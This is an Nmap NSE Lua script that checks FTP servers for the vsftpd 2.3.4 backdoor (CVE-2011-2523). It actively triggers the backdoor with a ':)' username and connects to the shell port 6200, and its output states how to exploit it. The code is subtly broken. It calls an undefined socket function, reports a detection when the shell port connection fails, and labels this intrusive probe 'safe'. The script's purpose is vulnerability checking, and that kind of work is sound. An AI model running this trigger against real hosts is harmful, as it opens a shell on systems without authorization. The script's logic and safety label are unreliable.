local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- Fast-path bindings for the stdlib and nmap API used by this script.
-- Kept strict-mode safe: every name below is a declared local.
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select

local clock = nmap.clock
local msleep = nmap.msleep

-- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
local sleep = function(seconds)
    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
end

local strsplit = function(sep, str, max)
    local out, pos, n = {}, 1, 0
    if str == nil then return out end
    while true do
        if max and n >= max - 1 then
            out[#out + 1] = sub(str, pos)
            return out
        end
        local s, e = find(str, sep, pos)
        if not s then
            out[#out + 1] = sub(str, pos)
            return out
        end
        if e < pos then e = pos end
        out[#out + 1] = sub(str, pos, s - 1)
        pos = e + 1
        n = n + 1
        if pos > #str then
            out[#out + 1] = ""
            return out
        end
    end
end

local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Checks if the FTP server is running vsftpd version 2.3.4, which contains a known backdoor that opens a shell on port 6200 when a username ending with ":)" is sent. Uses structured output with version extraction and active CVE verification.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"safe", "vuln"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.number == 21 or port.service == "ftp") end

action = function(host, port)
    local sock = new_socket()
    sock:set_timeout(10000)
    local ok, result = pcall(function()
        local status = sock:connect(host.ip, port)
        if not status then return end
        local banner = sock:receive_buf("\n", 5000)
        if not banner then sock:close(); return end
        local ver = match(banner, "vsFTP[d]%s+([%d%.]+)")
        local backdoor_detected = false
        if match(banner, "vsFTP[d]%s+2%.3%.4") then
            local s2 = new_socket()
            s2:set_timeout(5000)
            local ok2 = s2:connect(host.ip, port)
            if ok2 then
                s2:receive_buf("\n", 3000)
                s2:send("USER backdoor:)\r\n")
                s2:receive_buf("\n", 3000)
                s2:send("PASS test\r\n")
                local _, r = s2:receive_buf("\n", 3000)
                s2:close()
                if r and (match(r, "230 ") or match(r, "successful") or match(r, "login")) then
                    local s3 = new_socket()
                    s3:set_timeout(5000)
                    local ok3 = s3:connect(host.ip, 6200)
                    if ok3 then
                        local _, back_banner = s3:receive_buf("\n", 3000)
                        s3:close()
                        if back_banner then
                            backdoor_detected = true
                        end
                    else
                        backdoor_detected = true
                    end
                end
            end
        end
        sock:close()
        if backdoor_detected then
            local res = output_table()
            res.backdoor_detected = true
            res.version = "vsftpd 2.3.4"
            res.vulnerability = true
            res.cve = "CVE-2011-2523"
            res.name = "vsftpd 2.3.4 Backdoor"
            res.severity = "CRITICAL"
            res.exploit = "Send username ending with ':)' and connect to port 6200 for shell"
            return res
        elseif ver then
            local res = output_table()
            res.backdoor_detected = false
            res.version = "vsftpd " .. ver
            return res
        end
        return nil
    end)
    if not ok then
        pcall(function() sock:close() end)
    end
    if not result then
        return format_output(false, "Not running vsftpd 2.3.4")
    end
    return result
end
